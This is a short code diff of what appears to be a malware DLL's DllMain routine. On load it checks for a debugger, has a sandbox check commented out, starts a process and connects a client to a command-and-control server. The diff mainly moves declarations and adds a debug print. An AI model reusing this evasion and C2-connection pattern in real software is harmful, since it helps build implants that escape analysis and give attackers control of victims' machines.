@@ -32,11 +32,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 					  LPVOID lpReserved
 )
 {
-	ProcessManager mgr;
-
 	switch ( ul_reason_for_call )
 	{
 	case DLL_PROCESS_ATTACH:		
+		ProcessManager mgr;
 		mgr.CheckNoDebugger();
 
 		//if ( SandboxCompromise::SuspicousProcRunning() )
@@ -66,8 +65,11 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			&pi
 		);
 
-		// try to connect to c2 server
+		OutputDebugStringA("yes");
+
 		Client me;
+
+		// try to connect to c2 server
 		if ( !me.Connect() )
 			me.~Client();
 
